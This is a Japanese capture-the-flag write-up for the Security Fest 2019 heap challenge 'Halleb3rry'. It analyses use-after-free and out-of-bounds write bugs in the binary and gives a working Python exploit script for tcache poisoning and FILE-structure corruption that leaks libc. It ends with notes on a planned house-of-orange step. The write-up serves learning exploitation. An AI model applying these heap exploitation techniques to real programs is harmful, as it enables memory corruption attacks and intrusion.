# [pwn 1003pts] Halleb3rry - Security Fest 2019
64ビットでPIE以外は有効です。
```
$ checksec -f pwn
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable  FILE
Full RELRO      Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   No Symbols      Yes	0		3	pwn
```
ヒープ問です。
最初にスタック変数に名前を入力した後、alloc array, edit array, delete array, print nameができます。
順番に処理を見ていきましょう。

`alloc_array`では0から0x80までのサイズを指定でき、そのサイズだけmallocされます。
ポインタはグローバル変数arrayに入れられます。
このサイズ取得に使った変数をなぜかmemsetで空にし、その後指定したサイズだけarrayに入力できます。
このとき`array`がNULLかを確認する処理はありません。
`edit_array`では1以上のインデックスを指定すると、`array[i]`に数字を入れられます。
このときサイズチェックをしないので好きな場所を書き換えられます。
`delete_array`ではarrayがNULLでなければ`free(array)`します。
このとき`array = NULL`はしていないので、UAFがあります。
メモリリークはどこ...？

この手の問題ではFILE構造体を使えってばっちゃが言ってた。
stdout/stderrは出力バッファを示すポインタ(`_IO_write_ptr`)を持ってるのでそれを書き換えてやれば任意のアドレスのデータを出力させられます。
そしてbssセクションにはstdout/stderrへのポインタが格納されているので、tcache poisoningでここへポインタを向けてやればstderr本体へ書き込めることになります。

```
pwndbg> x/xg &stderr
0x602040 <stderr>:	0x00007ffff7dd0680
pwndbg> x/32xg 0x00007ffff7dd0680
0x7ffff7dd0680 <_IO_2_1_stderr_>:	0x00000000fbad2887	0x00007ffff7dd0703
0x7ffff7dd0690 <_IO_2_1_stderr_+16>:	0x00007ffff7dd0703	0x00007ffff7dd0703
0x7ffff7dd06a0 <_IO_2_1_stderr_+32>:	0x00007ffff7dd0703	0x00007ffff7dd0703
0x7ffff7dd06b0 <_IO_2_1_stderr_+48>:	0x00007ffff7dd0703	0x00007ffff7dd0703
0x7ffff7dd06c0 <_IO_2_1_stderr_+64>:	0x00007ffff7dd0704	0x0000000000000000
0x7ffff7dd06d0 <_IO_2_1_stderr_+80>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd06e0 <_IO_2_1_stderr_+96>:	0x0000000000000000	0x00007ffff7dd0760
0x7ffff7dd06f0 <_IO_2_1_stderr_+112>:	0x0000000000000002	0xffffffffffffffff
0x7ffff7dd0700 <_IO_2_1_stderr_+128>:	0x0000000000000000	0x00007ffff7dd18b0
0x7ffff7dd0710 <_IO_2_1_stderr_+144>:	0xffffffffffffffff	0x0000000000000000
0x7ffff7dd0720 <_IO_2_1_stderr_+160>:	0x00007ffff7dcf780	0x0000000000000000
0x7ffff7dd0730 <_IO_2_1_stderr_+176>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd0740 <_IO_2_1_stderr_+192>:	0x00000000ffffffff	0x0000000000000000
0x7ffff7dd0750 <_IO_2_1_stderr_+208>:	0x0000000000000000	0x00007ffff7dcc2a0
0x7ffff7dd0760 <_IO_2_1_stdout_>:	0x00000000fbad2a84	0x0000000000603260
0x7ffff7dd0770 <_IO_2_1_stdout_+16>:	0x0000000000603260	0x0000000000603260
```

ここで見えているのは_IO_FILE構造体で、次のように定義されます。
```c
struct _IO_FILE {
int _flags; /* High-order word is _IO_MAGIC; rest is flags. */
#define _IO_file_flags _flags
/* The following pointers correspond to the C++ streambuf protocol. */
/* Note: Tk uses the _IO_read_ptr and _IO_read_end fields directly. */
char* _IO_read_ptr; /* Current read pointer */
char* _IO_read_end; /* End of get area. */
char* _IO_read_base; /* Start of putback+get area. */
char* _IO_write_base; /* Start of put area. */
char* _IO_write_ptr; /* Current put pointer. */
char* _IO_write_end; /* End of put area. */
char* _IO_buf_base; /* Start of reserve area. */
char* _IO_buf_end; /* End of reserve area. */
/* The following fields are used to support backing up and undo. */
char *_IO_save_base; /* Pointer to start of non-current get area. */
char *_IO_backup_base; /* Pointer to first valid character of backup area */
char *_IO_save_end; /* Pointer to end of non-current get area. */
struct _IO_marker *_markers;
struct _IO_FILE *_chain;
int _fileno;
int _blksize;
_IO_off_t _old_offset; /* This used to be _offset but it’s too small. */ 
```

この`_IO_write_base`と`_IO_write_ptr`の間にあるデータが出力されます。
ちなみに今回はstderrを使ってくれているのでこっちからstdoutを変更します。（ポインタを消してしまうので。）
要するに、double freeした後にchunkの先頭にstderrを書き込めば
```
tcache --> chunk --> stderr --> _IO_2_1_stderr_
```
という状況になるので、allocしまくれば`_IO_2_1_stderr_`に到達します。
次にstdoutが出力するptr周辺にlibcのアドレスがあるかという話です。
このポインタはヒープ上にあるので単純にヒープの最初の方にlibcのアドレスを置いておけばOKです。
残念ながらサイズが0x80までしか指定できないのでそのままではunsorted binは使えません。
したがって、今回はヒープオーバーフローを使ってchunk sizeを書き換え、無理やりunsorted binに繋げます。

```python
from ptrlib import *

def alloc(size, data):
    sock.recvuntil("> ")
    sock.sendline("1")
    sock.recvuntil("size: ")
    sock.sendline(str(size))
    sock.recvuntil("data: ")
    sock.send(data)

def edit(index, byte):
    sock.recvuntil("> ")
    sock.sendline("2")
    sock.recvuntil("index: ")
    sock.sendline(str(index))
    sock.recvuntil("byte: ")
    sock.send(str(byte))

def delete():
    sock.recvuntil("> ")
    sock.sendline("3")

def print_name():
    sock.recvuntil("> ")
    sock.sendline("4")
    sock.recvuntil("pwner: ")
    return sock.recvline().rstrip()

libc = ELF("./libc.so.6")
elf = ELF("./pwn")
sock = Process("./pwn")
main_arena = 0x3ebc40
delta = 1168

# Name
sock.recvuntil("name: ")
sock.sendline("taro")

## Chunk overlap
alloc(0x18, "B" * 0x18)
delete() # push to tcache
alloc(0x28, "A" * 0x28)
delete()
alloc(0x18, "B" * 0x18)
edit(0x18, 0x01) # 0x31 --> 0x01
edit(0x19, 0x05) # 0x01 --> 0x501
edit(0x18 + 0x500, 0x31) # fake chunk size
edit(0x18 + 0x500 + 0x30, 0x31)
alloc(0x28, "A" * 0x18)
delete() # pon!

## TCache Poisoning to leak libc
alloc(0x68, "CCCC")
delete()
delete()
alloc(0x68, p64(elf.symbol("stderr")))
alloc(0x68, "Hello")
alloc(0x68, "X" * 8) # stderr
alloc(0x68, p64(0xfbad2a84)) # _IO_2_1_stderr_
# change 0x603260 --> 0x60f260
edit(0x109, 0xf2)

while True:
    r = sock.recv().replace(b"\x00", b"")
    if b'\x7f' in r:
        break
addr_main_arena = u64(r[r.index(b"Hello") + 5: r.index(b"Hello") + 5 + 6])
libc_base = addr_main_arena - main_arena - delta
dump("libc base = " + hex(libc_base))
```
やっほい。
```
$ python solve.py 
[+] Process: Successfully created new process (PID=19676)
[ptrlib] libc base = 0x7f04bbefe000
```

後はdouble freeするだけ！と思ったのですが、なぜか上手くいきません。
よくコードを読んでみると、なんとfreeは5回までしか使えないのです。
なんでこういうことするかなぁ。

参考文献[1]によると、ここでhouse of orangeという技法を使います。
house of ...系は名前だけ聞いたことはありましたが、こういうのに使うんだ。

ざっと調べたのでやってみましょう。
libc leak終了後のtop_chunkの様子は次のようになっています。

```
pwndbg> top_chunk 
0xd6c2b0 PREV_INUSE {
  mchunk_prev_size = 18367622009667905, 
  mchunk_size = 130385, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
```
今0xd6c2b0なので0x20000でアラインしてold_endを0xd80000にする必要があります。
そのためにはサイズ0x80のチャンクを634回確保して、top_chunkのアドレスを0xd7ffb0にした後、editでsizeを0x51に変更してやればOKです。



# 感想
これ1つでめちゃくちゃ勉強になりました。

# 参考文献
[1] [https://kileak.github.io/ctf/2019/secfest-halleb3rry/](https://kileak.github.io/ctf/2019/secfest-halleb3rry/)
[2] [http://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html](http://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html)